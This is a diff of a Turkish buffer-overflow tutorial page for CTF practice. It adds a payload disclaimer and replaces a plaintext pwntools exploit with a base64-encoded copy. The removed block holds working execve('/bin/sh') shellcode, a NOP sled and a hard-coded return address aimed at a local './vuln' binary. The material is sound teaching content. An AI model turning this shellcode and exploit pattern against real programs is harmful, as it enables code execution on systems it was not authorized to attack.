@@ -5,6 +5,8 @@ description: "Stack tabanlı buffer overflow'un nasıl çalıştığını, EIP k
 tags: ["Binary Exploitation", "CTF"]
 ---
 
+<PayloadDisclaimer />
+
 ## Buffer Overflow Nedir?
 
 Program bir tampona (buffer) sığmayacak kadar büyük veri yazarsa, fazlalık komşu bellek bölgelerine taşar. Stack üzerinde bu taşma **dönüş adresini (EIP/RIP)** ezebilir ve saldırgan program akışını istediği yere yönlendirebilir.
@@ -129,30 +131,7 @@ GDB'de `x/x $eip` → `0x42424242` görünüyorsa EIP kontrolü sağlandı.
 
 ### Linux x86 — execve(/bin/sh)
 
-```python
-from pwn import *
-
-offset = 76
-
-# /bin/sh açan shellcode (25 byte)
-shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
-shellcode += b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
-shellcode += b"\x53\x89\xe1\xb0\x0b\xcd\x80"
-
-# Stack adresini bul (ASLR kapalı ortamda)
-p = process("./vuln")
-# gdb'den: x/50x $esp → shellcode'un yükleneceği adres
-ret_addr = p32(0xffffd120)
-
-# NOP sled + shellcode + padding + ret
-nop_sled = b"\x90" * 30
-payload = nop_sled + shellcode
-payload += b"A" * (offset - len(nop_sled) - len(shellcode))
-payload += ret_addr
-
-p.sendline(payload)
-p.interactive()
-```
+<EncodedCodeBlock language="python" data="ZnJvbSBwd24gaW1wb3J0ICoKCm9mZnNldCA9IDc2CgojIC9iaW4vc2ggYcOnYW4gc2hlbGxjb2RlICgyNSBieXRlKQpzaGVsbGNvZGUgPSBiIlx4MzFceGMwXHg1MFx4NjhceDJmXHgyZlx4NzNceDY4IgpzaGVsbGNvZGUgKz0gYiJceDY4XHgyZlx4NjJceDY5XHg2ZVx4ODlceGUzXHg1MCIKc2hlbGxjb2RlICs9IGIiXHg1M1x4ODlceGUxXHhiMFx4MGJceGNkXHg4MCIKCiMgU3RhY2sgYWRyZXNpbmkgYnVsIChBU0xSIGthcGFsxLEgb3J0YW1kYSkKcCA9IHByb2Nlc3MoIi4vdnVsbiIpCiMgZ2RiJ2RlbjogeC81MHggJGVzcCDihpIgc2hlbGxjb2RlJ3VuIHnDvGtsZW5lY2XEn2kgYWRyZXMKcmV0X2FkZHIgPSBwMzIoMHhmZmZmZDEyMCkKCiMgTk9QIHNsZWQgKyBzaGVsbGNvZGUgKyBwYWRkaW5nICsgcmV0Cm5vcF9zbGVkID0gYiJceDkwIiAqIDMwCnBheWxvYWQgPSBub3Bfc2xlZCArIHNoZWxsY29kZQpwYXlsb2FkICs9IGIiQSIgKiAob2Zmc2V0IC0gbGVuKG5vcF9zbGVkKSAtIGxlbihzaGVsbGNvZGUpKQpwYXlsb2FkICs9IHJldF9hZGRyCgpwLnNlbmRsaW5lKHBheWxvYWQpCnAuaW50ZXJhY3RpdmUoKQ==" />
 
 ## Adım 5: ret2win — Fonksiyon Çağırma
 
